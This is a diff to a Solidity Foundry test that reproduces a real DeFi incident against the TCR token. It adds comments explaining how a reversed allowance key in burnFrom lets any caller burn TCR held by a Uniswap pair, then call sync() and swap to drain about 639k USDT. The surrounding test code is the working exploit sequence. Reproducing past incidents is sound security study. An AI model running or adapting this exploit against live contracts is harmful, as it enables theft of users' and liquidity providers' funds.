@@ -12,6 +12,28 @@ import "./../interface.sol";
     - Vuln Contract: https://etherscan.io/address/0xe38b72d6595fd3885d1d2f770aa23e94757f91a1
     - Attack Tx: https://app.blocksec.com/explorer/tx/eth/0x81e9918e248d14d78ff7b697355fd9f456c6d7881486ed14fdfb69db16631154
 */
+
+// VULNERABILITY: Incorrect allowance check direction in TcrToken.burnFrom (reversed mapping keys)
+// The burnFrom implementation checks and uses _allowances[msg.sender][from] instead of the correct _allowances[from][msg.sender].
+// See TcrToken.sol:155: require(_allowances[msg.sender][from] >= amount...
+// and _approve(msg.sender, from, ...) which also writes the reversed key.
+// Standard ERC20 semantics (and the token's own transferFrom/_allowanceTransfer) use _allowances[from][spender].
+// Why it exists: developer copy-paste or indexing error when implementing burnFrom (burns "from" using allowance granted by "from").
+// Impact: Any caller who has called approve(spender=ANY) on TCR can burn arbitrary amounts of TCR from ANY address (including Uniswap pair reserves)
+//   by calling burnFrom(victim, amount), because their own approval sets the key that burnFrom reads.
+// This is not a standard approval-for-burn; the attacker never needs the victim to approve them.
+
+// EXPLOIT STEPS:
+// 1. Attacker contract (this) seeds 0.04 ETH, approves USDT/TCR to router and crucially TCR.approve(pool, MAX) which executes _approve(attacker, pool, MAX) => _allowances[attacker][pool] = MAX (TcrToken.sol:455).
+// 2. Swap WETH->USDT->TCR via router to acquire attackerTCRbalance (line ~79).
+// 3. Query poolTCRbalance = TCR.balanceOf(pool), then TCR.burnFrom(pool, poolTCRbalance - 1e8) (line 81).
+//    Inside burnFrom: msg.sender=attacker, from=pool => require(_allowances[attacker][pool] >= amt) passes (the key set in step 1).
+//    Then _burn(pool, amt) which does _balances[pool] -= amt; totalSupply -= amt (TcrToken.sol:477).
+//    Result: Uniswap pair TCR balance drops dramatically while USDT balance unchanged; k invariant broken.
+// 4. Call pair.sync() (line 83) => forces reserves = current balances (UniswapV2Pair.sol:502), now TCR reserve << USDT reserve.
+// 5. Swap attacker's TCR for USDT (line 86): router computes huge output USDT because TCR is artificially scarce in the pair. Profit extracted.
+// 6. (In real attack) ~639k USDT drained.
+
 interface IUSDTInterface {
     function approve(address spender, uint256 value) external;
 }
@@ -64,6 +86,9 @@ contract ExploitTest is Test {
     function testExploit() external {
         IUSDTInterface(usdt).approve(route, type(uint256).max);
         ITcrInterface(TCR).approve(route, type(uint256).max);
+        // VULNERABILITY TRIGGER: This approve sets the REVERSED allowance that the buggy burnFrom will read.
+        // TCR.approve(pool, MAX) => TcrToken._approve(msg.sender=attacker, spender=pool, amt) => _allowances[attacker][pool] = MAX
+        // (see TcrToken.sol:455 and the reversed check at burnFrom:155)
         ITcrInterface(TCR).approve(pool, type(uint256).max);
 
         emit log_named_decimal_uint(
@@ -78,8 +103,12 @@ contract ExploitTest is Test {
 
         IUNIswapV2(route).swapExactETHForTokens{value: wethAmount}(1, path, address(this), deadline);
         uint256 poolTCRbalance = IERC20(TCR).balanceOf(pool);
+        // CRITICAL EXPLOIT CALL: burn TCR directly out of the Uniswap pair's token balance (not via LP burn).
+        // Because of the reversed allowance, no approval from the pool was needed.
         ITcrInterface(TCR).burnFrom(pool, poolTCRbalance - 100_000_000);
         uint256 attackerTCRbalance = IERC20(TCR).balanceOf(address(this));
+        // sync() updates the pair's internal reserves to the post-burn balances (TCR now tiny).
+        // Without this, the router swap would still use stale (pre-burn) reserves.
         IPairPoolInterface(pool).sync();
         address[] memory path2 = new address[](2);
         path2[0] = TCR;
